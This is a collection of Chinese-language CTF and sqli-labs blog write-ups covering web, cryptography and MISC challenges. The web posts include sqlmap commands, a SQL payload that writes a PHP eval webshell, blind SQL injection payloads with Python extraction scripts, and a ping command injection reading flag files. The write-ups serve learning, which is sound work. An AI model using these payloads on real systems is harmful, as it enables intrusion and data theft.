Web10：单身一百年也没用这道题Web7单身二十年很像，但当我们直接点击“到这里找KEY”然后再进行抓包时，找不到异常。额。不会了。。查看一下大佬的博客，了解到当我们先抓包再点击接着再抓包时候会找到302重定向错误代码，这时候可以在响应头中找到flag。大佬用的是火狐，而我的火狐有点问题，没有抓到中间重定向的包。所以我直接用的谷歌的Network百度302错误代码：302重定向又称之为302代表暂时性转移(Temporarily Moved )，英文名称：302 redirect。 也被认为是暂时重定向temporary redirect），一条对网站浏览器的指令来显示浏览器被要求显示的不同的URL，当一个网页经历过短期的URL的变化时使用。一个暂时重定向是一种服务器端的重定向，能够被搜索引擎蜘蛛正确地处理。 Web：Download~!题崩了，打不开了。。。。 Web11：COOKIE有一个提示0==not点开题目“please login first!”翻译成“请先登录！”，burpsuite抓包发现Cookie：Login=0，而0===not，所以将0改为1，再点击Forword发包，得到flag Web12：MYSQL题目没有提示，点开题目robots.txt这个我知道,之前做攻防世界的Web题遇到过robots协议robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。所以在url栏里输入robots.txt发现提示sql.php，在另一窗口打开。然后审计php代码，发现intval() 函数，百度一下intval() 函数intval() 函数用于获取变量的整数值。intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。 理解一下php代码1、$id等于$_GET[id]的整数值2、sql查询语句id=&#39;$id&#39;3、如果 $_GET[id]==1024返回“no! try again”，否则返回数据库content字段内容所以在sql.php页面进行get传参。get传递的参数不能等于1024，且查询时id=1024，所以get传一个整数部分为1024的浮点数即可。最终得到flag。 Web13：GBK Injection这道题是宽字节注入，我还没学到，就先用sqlmap做一下吧，正好可以熟悉熟悉sqlmap命令的使用至于为什么要加%df%df%27是双字节不转义单引号实现注入的方法，具体看大佬博客gbk字符编码和宽字节sql注入1、爆库命令： sqlmap.py -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27\" --current-db 所以当前数据库为：sae-chinaover2、爆表命令： sqlmap.py -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27\" --tables -D sae-chinalover 3、爆字段和数据发现6个表，根据题目标题GBK Injection，所以flag有可能在gbksqli表里命令： sqlmap.py -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27\" --dump -T gbksqli -D sae-chinalover 当然，如果没想到这个表，可以一个表一个表的试。需要注意的是，在ctf4表里也出现了flag但这个并不是这道题的答案。 Web14：变量覆盖似乎没听说过，那先了解一下有关变量覆盖的基础知识吧变量覆盖漏洞详解CTF之php变量覆盖漏洞开始做题点开显眼的source.php文件审计php代码，发现如果$pass==$thepassword_123就显示flag。所以构造get传参值，让两变量相等得到flag。就先总结这么多吧。。。。。。。。。。。。 感悟题不是太难，重点是基础知识的掌握。尤其是文件包含的理解和代码审计的能力。小白进阶ing。。。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/tags/Web/"},{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/tags/CTF/"},{"name":"南邮","slug":"南邮","permalink":"https://qwzf.gitee.io/blog/tags/南邮/"}],"author":"qwzf"},{"title":"Crypto-简单加密","slug":"Crypto-简单加密","date":"2019-07-21T13:30:41.000Z","updated":"2019-08-06T15:21:20.446Z","comments":true,"path":"2019/07/21/Crypto-简单加密/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/07/21/Crypto-简单加密/","excerpt":"","text":"前言由于上次总结了位移编码，于是又补了一篇简单加密。 围在栅栏中的爱首先看到密文，这是摩斯电码可以直接在线摩斯电码解密：得到英文字母KIQLWTFCQGNSOO发现并没有什么规律，根据题目“围在栅栏中的爱”，进行栅栏解密也得不到有用信息。看到题目描述“最近一直在好奇一个问题，QWE到底等不等于ABC？”QWE？！很明显这是键盘密码的键盘替换密码，也就是键盘QWE加密法了解一下相关知识： 电脑键盘加密包围圈加密如：k我们可以加密为ijmll可以加密为pkm竖对称加密如：l对称ao对称wv对称v(中心点不加密)e对称iqwe v码如：a=qw s=we q=12 z=as夹位法如：a=qz w=sx k=i p=p凯撒移位明文:help密文:jrza猪圈带入如：d=qwed键盘手势看手运动的轨迹如：ytfvbhn手势是aQWE替换加密如：QWERT对应ABCDE当然还有很多，可以了解一下 开始做题因为这道题涉及了QWE替换加密，所以配一张图可以一个一个进行对照，当然这也有个大佬的脚本 def search(x): return&#123;'q':'a','w':'b','e':'c','r':'d','t':'e','y':'f','u':'g','i':'h','o':'i','p':'j','a':'k', 's':'l','d':'m','f':'n','g':'o','h':'p','j':'q','k':'r', 'l':'s','z':'t','x':'u','c':'v','v':'w','b':'x','n':'y','m':'z', &#125;.get(x,x)def main(): print(\"QWE键盘解密程序\") print(\"请输入待解密的字符串：\") while True: try: miwen=input() miwen=miwen.lower() print(\"结果是：\") for i in miwen: print(search(i),end='') print(\"\\n\") except: breakif __name__==\"__main__\": main() 密文为：KIQLWTFCQGNSOO解密后：RHASBENVAOYLII然后再根据题目标题，想到栅栏解密，结果有两种：第1种：RABNAYIHSEVOLI第2种：RVHAAOSYBLEINI很显然是第一种结果的倒序，反转以后结果如下：ILOVESHIYANBAR试了之后发现最后结果要小写，有点坑。。。 小心猪圈很明显是Base64加密的，所以了解一下Base64、Base32和Base16： Base64、Base32、Base16范围Base64范围：A-Z、a-z、0-9、+/Base32范围：A-Z、2-7Base16范围：0-9、A-F当ASCll用Base加密达不到所对应的位数的时候用=号补齐编码方式ASCII 是用128（2的8次方）个字符，对二进制数据进行编码的方式base64编码是用64（2的6次方）个字符，对二进制数据进行编码的方式base32就是用32（2的5次方）个字符，对二进制数据进行编码的方式base16就是用16（2的4次方）个字符，对二进制数据进行编码的方式Base64Base64加密方式是将三个八位的字节转化为四个六位的字节（不足八位的高位补00），38 = 46；，所以base64加密过后的内容比原来的大三分之一；如：加密“ace”ace转化为二进制为：‭01100001‬ ‭01100011‬ ‭01100101‬转化为base64的四字节六位：011000 01‬‭0110 0011‬01 100101‬那因为计算机是一字节八位的存数，所以高位补00后变为：00011000 0001‬‭0110 000011‬01 00100101‬转化为十进制：24 22 13 37Base32 Base32将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足8比特高位补0）串联起来，按照5比特一组进行切分，并将每组二进制值转换成十进制来对应32个可打印字符中的一个。Base16Base16编码使用16个ASCII可打印字符（数字0-9和字母A-F）对任意字节数据进行编码。Base16先获取输入字符串每个字节的二进制值（不足8比特在高位补0），然后将其串联进来，再按照4比特一组进行切分，将每组二进制数分别转换成十进制，在下述表格中找到对应的编码串接起来就是Base16编码。可以看到8比特数据按照4比特切分刚好是两组，所以Base16不可能用到填充符号“=”。了解结束开始做题，首先将题目字符串进行Base64解密发现16进制数值，然后Base16解密发现数字最大小于7，所以Base32解密然后又发现是Base64，所以Base64解密发现flag那种样式了，然后根据题目“小心猪圈”，应该就是猪圈密码解密了，先了解一下猪圈密码： 猪圈密码猪圈密码还有一个名字叫共济会密码，属于最古老的密码之一，也是密码学里最简单易懂的密码。它是以格子为基准的简单代替式逻辑密码，无论怎么变化都可以找到逻辑替代的方法，曾经是美国内战时盟军使用的密码。对应下图就是：HORSE下面给了个猪圈密码的对照表所以对密文：ocjp{zkirjwmo-ollj-nmlw-joxi-tmolnrnotvms}进行猪圈对照，ocjp对应flag，依次对照得到flag上边那个QWE键盘加密的脚本改写写一下就可以了def search(x): return&#123;'j':'a','k':'b','l':'c','m':'d','n':'e','o':'f','p':'g','q':'h','r':'i','w':'s','x':'t', 'y':'u','z':'v','a':'j','b':'k','c':'l','d':'m','e':'n', 'f':'o','g':'p','h':'q','i':'r','s':'w','t':'x','u':'y','v':'z', &#125;.get(x,x)def main(): print(\"解密程序\") print(\"请输入待解密的字符串：\") while True: try: miwen=input() miwen=miwen.lower() print(\"结果是：\") for i in miwen: print(search(i),end='') print(\"\\n\") except: breakif __name__==\"__main__\": main() 混合编码下载题目，并打开发现是Base64，Base64解密得解密结果是Unicode？！了解一下 UnicodeUnicode编码后的大小是一样的.例如一个英文字母 “a” 和 一个汉字 “好”，编码后都是占用的空间大小是一样的，都是两个字节！Unicode可以用来表示所有语言的字符，而且是定长双字节（也有四字节的）编码，包括英文字母在内。 UNICODE字符集有多个编码方式，分别是UTF-8，UTF-16，UTF-32和UTF-7编码。 好了开始做题，unicode解码 然后再Base64解码 很明显结果是10进制，所以10进制转ASCII 得到flag。 疑惑的汉字汉字有关的密码？！我想到了当铺密码，了解一下 当铺密码当铺密码就是一种将中文和数字进行转化的密码，算法相当简单:当前汉字有多少笔画出头，就是转化成数字几。所以转化一下然后10进制转ASCII得到flag 感悟对密码这一块又有了掌握，做题过程中发现好多RSA的题，该总结总结了，继续努力！小白进阶ing。。。。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/tags/CTF/"},{"name":"Crypto","slug":"Crypto","permalink":"https://qwzf.gitee.io/blog/tags/Crypto/"},{"name":"简单加密","slug":"简单加密","permalink":"https://qwzf.gitee.io/blog/tags/简单加密/"}],"author":"qwzf"},{"title":"sqli-labs攻关2(Less-7_Less-10)","slug":"sqli-labs攻关2(Less-7_Less-10)","date":"2019-07-19T14:05:21.000Z","updated":"2019-11-16T17:07:15.812Z","comments":true,"path":"2019/07/19/sqli-labs攻关2(Less-7_Less-10)/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/07/19/sqli-labs攻关2(Less-7_Less-10)/","excerpt":"","text":"前言之前已经通过sqli-libs攻关的方式，总结过SQL注入的简单注入和双注入。所以这次继续通过sqli-libs攻关的方式总结SQL注入的布尔盲注和时间盲注。 正文在开始盲注前，先把之前未总结的导出文件GET字符型注入学习一下 一、导出文件-GET注入导出文件1、LOAD_FILE可以利用该函数，进写入shell用法：select load_file(‘file1’) into outfile ‘file2’将file1的文件导入WEB目录file2的文件中进行访问。2、payload中只能在/home/wwwroot/default/mysql才能写入或者读取文件。因为mysql目录的权限我们设置chowm -R mysql:mysql3、另外要保证正常的文件写入与读取要在mysql配置文件my.cnf最后一行新增secure_file_priv= “/“方法，才能使用LOAD_FILE在生产环境情况下。 利用导出到文件就是可以将查询结果导出到一个文件中，如常见的将一句话木马导出到一个php文件中，sqlmap中也有导出一句话和一个文件上传的页面。常用的语句是： select &quot;&lt;?php @eval($_POST[&#39;giantbranch&#39;]);?&gt;&quot; into outfile &quot;XXX\\test.php&quot; ，当这里要获取到网站的在系统中的具体路径（绝对路径）获取方法，根据系统和数据库猜测。如winserver的asp默认路径是c:/inetpub/wwwroot/linux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/html等apache/var/www/htm，/var/www/html/htdocs Less-7导出文件GET字符型注入1、利用写入新增任意文件payload ?id=-1')) union select 1,2,'&lt;?php eval($_POST[\"cmd\"]);?&gt;' into outfile \"/home/wwwroot/default/mysql/1.txt\" --+ 2、验证是否写入成功payload访问写入的文件mysql/1.txt 二、GET盲注布尔盲注1.布尔盲注利用前提页面没有显示位，没有输出SQL语句执行错误信息，只能通过页面返回正常不正常来判断是否存在注入。2.布尔盲注过程(select count(schema_name) from information_schema.sc hemata)&gt; n n为数据库个数，当数据库个数大于n页面显示正常(select length(schema_name) from information_schema.s chemata limit 0,1)&gt; n 该语句判断数据库内第一个数据库名有多少字符，大于n则页面显示正常 (select ascii(substr((select schema_name from informa tion_schema.schemata limit 0,1),1,1)))&gt;105 ascii（）将返回字符串的ascii值。第一个1，表示截取字符串的起始位置。第二个1，表示截取字符串长度语句作用：判断第一个库第一个字符是什么时间盲注1.时间盲注利用前提页面上没有显示位，也没有输出SQL语句执行错误信息。 正 确的SQL语句和错误的SQL语句返回页面都一样，但是加入sleep(5)条 件之后，页面的返回速度明显慢了5秒。2.时间盲注过程if((select count(schema_name) from information_schema. schemata)=9,sleep(5),1) 判断数据库个数if((select length(schema_name) from information_schem a.schemata limit 0,1)=18,sleep(5),1) if((select ascii(substr((select schema_name from info rmation_schema.schemata limit 0,1),1,1)))=105,sleep(5),1) 判断 第一个库第一个字符相关函数Length（）函数 返回字符串的长度substr（）截取字符串ascii（）返回字符的ascii码sleep(n)：将程序挂起一段时间 n为n秒if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句 思路1.先利用length()判断数据库长度2.然后利用if函数、substr函数和ascii函数构造猜测数据库名ascii码的值的语句。 Less-8布尔型单引号GET盲注1、测试1.测闭合方式输入id=1输入id=1&#39;输入id=1’–+正常，输入id=1’ and 1=1–+正常，输入id=1’ and 1=2–+不回显，可判定是字符型注入并且为单引号闭合。2.测列输入id=1&#39; order by 4--+不回显，说明有三列。3.测长度判断数据库名的长度输入id=1&#39; and (length(database())=8)--+正常说明长度为8。4.测字符用substr()截取字符串的每个字符，ascii()将字符串转换成其ASCII码输入id=1&#39; and (ascii(substr(database(),1,1))&gt;97)--+正常2、注入1.猜库第一个字符输入?id=1' and (ascii(substr(database(),1,1))&gt;110)--+正常，输入?id=1' and (ascii(substr(database(),1,1))&gt;116)--+不回显，输入?id=1' and (ascii(substr(database(),1,1))&gt;113)--+正常，输入?id=1' and (ascii(substr(database(),1,1))&gt;114)--+正常，输入?id=1' and (ascii(substr(database(),1,1))&gt;115)--+不回显， 说明数据库名的第一个字符ASCII码为115，即“s”。第二个字符 输入?id=1' and (ascii(substr(database(),2,1))&gt;101)--+不回显，输入?id=1' and (ascii(substr(database(),2,1))&gt;100)--+正常， 说明第二个字符是“e“。以此类推。_脚本_ url = \"http://localhost/sqlilabs/Less-8/?id=\"start_str = \"1' and \"info_table_name = \"schemata\"info_column_name = \"schema_name\" 2.猜表payload?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))&gt;97)--+ 正常 然后改变大于号后面的数字，查找到第一个字符的ASCII码，再改变substr()函数的第二个参数值获取下一个字符，改变limit子句判断下一个表名。_脚本_info_table_name = \"tables\"info_column_name = \"table_name\"database_name = \"security\"where_str = \" where table_schema='\"+database_name+\"'\" 3.猜字段payload?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' and table_schema='security' limit 0,1),1,1))&gt;97--+ _脚本_ info_table_name = \"columns\"info_column_name = \"column_name\"table_name = \"users\"where_str = \" where table_schema='\"+database_name+\"'\"+\" and table_name='\"+table_name+\"'\" 4.数据payload?id=1' and ascii(substr((select username from security.users limit 0,1),1,1))&gt;65--+ _脚本_column_name = [\"id\",\"username\",\"password\"]select_str = \"select concat_ws('-',\"+column_name[0]+\",\"+column_name[1]+\",\"+column_name[2]+\") from \"+table_name+\" limit \"+str(result_index)+\",1\" 脚本# conding:utf-8import requestsurl_init = \"http://localhost/sqli-labs/Less-8/?id=1\";;url_init_error = url_init + \"'\"length_init = requests.get(url_init).headers.get('Content-Length')database=\"\"# and ascii(substr((select database()),1,1))&gt;64 %23 然后不断增加后面的数字大小来确定#and ascii(substr((select table_name from information_schema.tables where table_schema=hex(int (database))),1,1))&gt;64 %23# 写一个方法二分快速获取应该判断的数字# 返回数字，传入布尔值，对还是错，对应的数字。# 正经的二分查询。有序的字符中，最大最小。65到122# 我们现在知道了返回长度多少是正确的和错误的#def get_length(url): length = requests.get(url).headers.get('Content-Length') #print(\"length:\"+str(length)) # 正确的 if (length == length_init): return True else: return Falsedef geturl(n,number): url = url_init_error+\"and ascii(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125; %23\".format(n,number) print(url) return urldef efs(min_number,max_number,n): if(max_number-min_number==1): print(\"[+] get \"+chr(max_number)) global database database=database+(chr(max_number)) print('[+] databse is &#123;0&#125;'.format(database)) return number = int((min_number+max_number)/2) #print(number) url = geturl(n,number) #print(url) #如果比中间大 if get_length(url): efs(number,max_number,n) else: efs(min_number,number,n)for n in range(1,10): #如果大于1都不满足就是结束了 if(get_length(geturl(n,1))is False): break else: efs(65,127,n) Less-9基于时间的GET单引号盲注Time型盲注和Bool型盲注应用场景不同之处在报错的返回上。Less8中，输入合法时会返回正常页面“You are in”，而非法输入时没有返回任何东西。于是可以根据这个特点跑盲注，通过不同的返回页面来判断匹配的字符是否正确。而在Less9中，合法输入与非法输入返回为同一个固定字符串。这样就不能根据页面的回显来判断匹配结果，要使用延时函数sleep()对两种输入进行区分。注意Time盲注时，穷举会比二分查找快很多。Bool盲注时，则二分查找更快一些。1、测试过程同Less8。与Less8相比，用了sleep()函数。2、注入注入过程同Less8。与Less8相比，用了sleep()函数。1.猜库payload输入?id=1' and if(ascii(substr((select database()),1,1))&gt;114,1,sleep(5))--+正常输入?id=1' and if(ascii(substr((select database()),1,1))&gt;115,1,sleep(5))--+延迟 说明第一个字符是s，然后以此类推得出数据库名。2.猜表payload输入?id=1' and if((ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))&gt;100),1,sleep(5))--+正常输入?id=1' and if((ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))&gt;101),1,sleep(5))--+延迟 说明第一个表的第一个字符为“e”。3.猜字段payload输入?id=1' and if((ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),1,1))&gt;104),1,sleep(5))--+正常输入?id=1' and if((ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),1,1))&gt;105),1,sleep(5))--+延迟 说明第一个字符为“i”。4.数据payload输入?id=1' and if((ascii(substr((select username from security.users limit 0,1),1,1))&gt;67),1,sleep(5))--+正常输入?id=1' and if((ascii(substr((select username from security.users limit 0,1),1,1))&gt;68),1,sleep(5))--+延迟 说明第一个字符为“D”。 脚本import requestsvalue =\"abcdefghigklmnopqrstuvwxyz@_.\"data=\"\"url = \"http://localhost:9096/sqli-labs/Less-9/?id=1' and if((substr((&#123;0&#125;),&#123;1&#125;,1)='&#123;2&#125;'),sleep(5),NULL); %23\"url_length=\"http://localhost:9096/sqli-labs/Less-9/?id=1' and if((length((&#123;0&#125;))=&#123;1&#125;),sleep(5),NULL); %23\"def get_length(payload): for n in range(1,100): url= url_length.format(payload,n) print(url) if(get_respone(url)): print(\"[+] length is &#123;0&#125;\".format(n)) return ndef get_data(payload,value,length): for n in range(1,length): for v in value : url_data = url.format(payload,n,v) print(url_data) if(get_respone(url_data)): global data data=data+v print(\"[+] data is &#123;0&#125;\".format(data)) breakdef get_respone(url): try: html = requests.get(url,timeout=4) return False except Exception as e: print(\"......\") return Truedatabse_payload =\"select database()\"get_data(databse_payload,value,get_length(databse_payload)+1) Less-10基于时间的GET双引号盲注和Less9差别只在于单双引号，修改查询语句闭合后用脚本注入即可。 感悟总结之后，又对盲注有了更深一步的理解。脚本是硬伤，我要继续好好学习python了。小白进阶ing。。。。","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://qwzf.gitee.io/blog/tags/SQL/"},{"name":"BUG","slug":"BUG","permalink":"https://qwzf.gitee.io/blog/tags/BUG/"},{"name":"导出文件注入","slug":"导出文件注入","permalink":"https://qwzf.gitee.io/blog/tags/导出文件注入/"},{"name":"GET型盲注","slug":"GET型盲注","permalink":"https://qwzf.gitee.io/blog/tags/GET型盲注/"}],"author":"qwzf"},{"title":"攻防世界-Web(新手区)","slug":"攻防世界-Web(新手区)","date":"2019-07-17T13:22:27.964Z","updated":"2019-09-05T16:01:47.759Z","comments":true,"path":"2019/07/17/攻防世界-Web(新手区)/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/07/17/攻防世界-Web(新手区)/","excerpt":"","text":"前言暑假前，为了学习Web题，做了攻防世界的新手区的Web题，当时没有总结，现在总结一下。 正文Web1：view_source查看源代码，右键不可以用。所以按F12，直接查看源码即可。 Web2：get_post HTTP的两种请求方式GETGET请求的数据会附在URL之后（就是把数据放置在HTTP协议头中）如： /test/1.php?name1=value1&amp;name2=value2 POSTPOST请求是把提交的数据放置在HTTP的消息主体中 如： POST /test/1.php HTTP/1.1Host: w3schools.comname1=value1&amp;name2=value2 所以为了方便，直接用火狐进行传参，即可得出flag。 Web3：robots robots协议robots.txt文件是一个文本文件，使用任何一个常见的文本编辑器，比如Windows系统自带的Notepad，就可以创建和编辑它[1] 。robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。 联想到在URL后加上robots.txt URL后加上f1ag_1s_h3re.php 在URL后加上robots.txt便得到了flag Web4：backup不知道。。。百度一下index.php文件的备份文件,在后面加上”.bak”,即index.php.bak得到flag。 Web5：cookie用Burpsuite抓包添加url后缀名cookie.php查看HTTP响应，即可得出flag Web6：disabled_button查看源码发现有disabled属性，disabled属性可设置或返回是否禁用单选按钮。所以删掉disabled属性删掉后可以点击了，点击一下，得到flag Web7：simple_js查看源码发现这个地方比较可疑，像16进制所以16进制转ASCII文本好像是ASCII码10进制值，所以10进制转ASCII得到flag Web8：xff_referer看到题目先了解下xff和referer XFFX-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。 简单地说，xff是告诉服务器当前请求者的最终ip的http请求头字段通常可以直接通过修改http头中的X-Forwarded-For字段来仿造请求的最终ip RefererHTTP来源地址（referer，或HTTPreferer）是HTTP表头的一个字段，用来表示从哪儿链接到当前的网页，采用的格式是URL。换句话说，借着HTTP来源地址，当前的网页可以检查访客从哪里而来，这也常被用来对付伪造的跨网站请求。 简单的讲，referer就是告诉服务器当前访问者是从哪个url地址跳转到自己的，跟xff一样，referer也可直接修改题目说IP地址必须为123.123.123.123所以抓包修改XFF而又显示请求来自http://www.google.com/，所以修改Referer然后点击Go，得到flag Web9：weak_auth(弱身份验证)随手设的密码，应该就是弱口令。而用户名是admin所以直接用Burpsuite进行字典(弱口令字典)爆破将password的值设为变量选择字典文件发现到123456时，长度不同，所以密码为123456，登陆一下即可得出flag Web10：webshell看题目，应该是一句话木马果然是一句话木马，直接菜刀连连接成功，得到flag Web11：command_execution(命令执行)看题目，先了解下ping、waf、命令执行、Linux命令 pingping命令用法 WAFWAFWAF主要防护的是来自对网站源站的动态数据攻击，可防护的攻击类型包括SQL注入、XSS攻击、CSRF攻击、恶意爬虫、扫描器、远程文件包含等攻击,相当于防火墙。 命令执行命令执行常见命令执行 command1 &amp; command2 ：先执行command2后执行command1command1 &amp;&amp; command2 ：先执行command1后执行command2command1 | command2 ：只执行command2command1 || command2 ：command1执行失败，再执行command2(若command1执行成功，就不再执行command2) Linux常用命令常用的Linux命令开始做题首先先尝试ping一下127.0.0.1方法一： ls命令查看目录文件用cat命令查看txt文件方法二：首先先尝试ping一下127.0.0.1，并回显执行的命令ping通本地后，发现传输三个数据包。查看三个数据包中是否有flag.txt输入命令 127.0.0.1 &amp; find / -name flag.txt 发现有flag.txt，再输入命令 127.0.0.1 | cat /home/flag.txt 查看flag.txt文件，得出flag Web12：simple_php看题目，这应该是代码审计 is_numeric() 函数用于检测变量是否为数字或数字字符串。 传入对应的参数即可得出flag 感悟做完攻防世界新手区的Web题，对Web题的类型有了大致了解。题不是太难，但可以学习到很多Web题的基础知识。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/tags/Web/"},{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/tags/CTF/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://qwzf.gitee.io/blog/tags/攻防世界/"}],"author":"qwzf"},{"title":"安恒月赛7月-MISC wp","slug":"安恒月赛7月-MISC wp","date":"2019-07-15T11:33:17.025Z","updated":"2019-07-31T16:10:49.210Z","comments":true,"path":"2019/07/15/安恒月赛7月-MISC wp/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/07/15/安恒月赛7月-MISC wp/","excerpt":"","text":"前言今天安恒月赛，和最近一部热剧有一点点关系。而我就做出了两道MISC题，还是写一下Write Up。。。。 MISC1：真正的CTFer在哪？！ 下载解压题目文件，发现一张图片 用binwalk分析一下，并没有隐藏文件 查看图片详细信息，没有隐藏东西。然后看了下图片宽高(分辨率)，并用winHex打开发现，高度不一致 将分辨率转换成16进制，0500应该改为0A00。高度恢复了 发现flag了 发现看不清，也可以看出。想用stegsove反色看一下，然而用stegsolve打不开修改高度后的图片。 于是百度了下原因 对一张正常的图片，通过修改其宽度或者高度隐藏信息，使计算出的CRC校验码与原图的CRC校验码不一致；windows的图片查看器会忽略错误的CRC校验码，因此会显示图片，但此时的图片已经是修改过的，所以会有显示不全或扭曲等情况，借此可以隐藏信息。 而Linux下的图片查看器不会忽略错误的CRC校验码，因此用Linux打开修改过宽或高的png图片时，会出现打不开的情况 箭头所指即为crc效验码。 可以通过爆破图片修改前的宽和高来匹配CRC校验码，并用正确的宽和高来修复图片 为了做题的方便，先尝试爆破高度，脚本如下(百度搜的，还不会写，只修改了参数)： # -*- coding: utf-8 -*-import binasciiimport struct#\\x49\\x48\\x44\\x52\\x00\\x00\\x01\\xF4\\x00\\x00\\x01\\xA4\\x08\\x06\\x00\\x00\\x00crc32key = 0x6F03AD71for i in range(0, 65535): height = struct.pack('&gt;i', i) #CRC: 6F03AD71 data = '\\x49\\x48\\x44\\x52\\x00\\x00\\x05\\x1C' + height + '\\x08\\x06\\x00\\x00\\x00' crc32result = binascii.crc32(data) &amp; 0xffffffff if crc32result == crc32key: print ''.join(map(lambda c: \"%02X\" % ord(c), height)) 运行脚本，输出000009E4，即原图片高度为00 00 09 E4爆破成功 修改后，发现可以用stegsolve打开了 MISC2：解不开的秘密 下载题目文件并解压。发现一个word文档和file文件。word文档是加密的，file是一串16进制。Hex转ASCII 很明显应该是Base64，解密 发现很多信息，第一印象先考虑password的值，发现并不对。于是仔细分析下解密的内容 Windows Registry Editor Version 5.00[HKEY_CURRENT_USER\\Software\\RealVNC][HKEY_CURRENT_USER\\Software\\RealVNC\\vnclicensewiz]\"_AnlClientId\"=\"8f5cc378-2e1d-4670-80e0-d2d81d882561\"\"_AnlSelected\"=\"0\"\"_AnlInclRate\"=\"0.0025\"[HKEY_CURRENT_USER\\Software\\RealVNC\\vncserver][HKEY_CURRENT_USER\\Software\\RealVNC\\VNCViewer4]\"dummy\"=\"\"[HKEY_CURRENT_USER\\Software\\RealVNC\\VNCViewer4\\MRU]\"00\"=\"127.0.0.1\"\"Order\"=hex:00,01\"01\"=\"127.0.0.1:5900\"[HKEY_CURRENT_USER\\Software\\RealVNC\\WinVNC4]\"Password\"=hex:37,5e,be,86,70,b3,c6,f3\"SecurityTypes\"=\"VncAuth\"\"ReverseSecurityTypes\"=\"None\"\"QueryConnect\"=dword:00000000\"PortNumber\"=dword:0000170c\"LocalHost\"=dword:00000000\"IdleTimeout\"=dword:00000e10\"HTTPPortNumber\"=dword:000016a8\"Hosts\"=\"+,\"\"AcceptKeyEvents\"=dword:00000001\"AcceptPointerEvents\"=dword:00000001\"AcceptCutText\"=dword:00000001\"SendCutText\"=dword:00000001\"DisableLocalInputs\"=dword:00000000\"DisconnectClients\"=dword:00000001\"AlwaysShared\"=dword:00000000\"NeverShared\"=dword:00000000\"DisconnectAction\"=\"None\"\"RemoveWallpaper\"=dword:00000000\"RemovePattern\"=dword:00000000\"DisableEffects\"=dword:00000000\"UseHooks\"=dword:00000001\"PollConsoleWindows\"=dword:00000001\"CompareFB\"=dword:00000001\"Protocol3.3\"=dword:00000000\"dummy\"=\"\" 百度搜索一下关键字RealVNC，发现这是VNC加密。了解一下相关知识 1、因为VNC的密码是保存在注册表中的，需要能读出来，这一点比PCANYWHERE的利用难度大一点 VNC3.0版本的的密码存放在HKEY_CURRENT_USER\\Software\\ORL\\WinVNC3\\Password 处 VNC4.0版本的密码存放在HKEY_CURRENT_USER\\Software\\RealVNC\\WinVNC4\\Password 处 2、假如我们已经获得了web服务器的webshell权限，同时对注册表有读取权限（这里如何获得web服务器的webshell权限，暂不介绍），我们使用命令webshell命令regedit -e c:\\vnc.reg HKEY_CURRENT_USER\\Software\\RealVNC\\WinVNC4\\ 把注册表信息导出到c盘下的vnc.reg文件，然后右键编辑 如上图，我们看到了加密后保存在注册表里的vnc密码，可以使用破解软件vncx4.exe来破解该密码 命令：vncx4 -W 然后顺序输入上面的每一个十六进制数据，每输完一个回车一次就行了 得到的密码，应该就是word文档的密码了。输入密码打开 根据提示，flag应该就在这里了。 首先，保存word里的图片，考虑图片隐写。然而并不是图片隐写，那flag应该还在word里。移走图片，发现 这个地方可能有东西，文件-&gt;选项-&gt;显示。显示(打印)隐藏文字。 然而并没有什么用。于是直接复制那串空白，粘贴到一个地方，得到flag了。。。 感悟做了安恒月赛的题，发现自己依旧还很菜。不过在做题的过程中又学到了新知识。 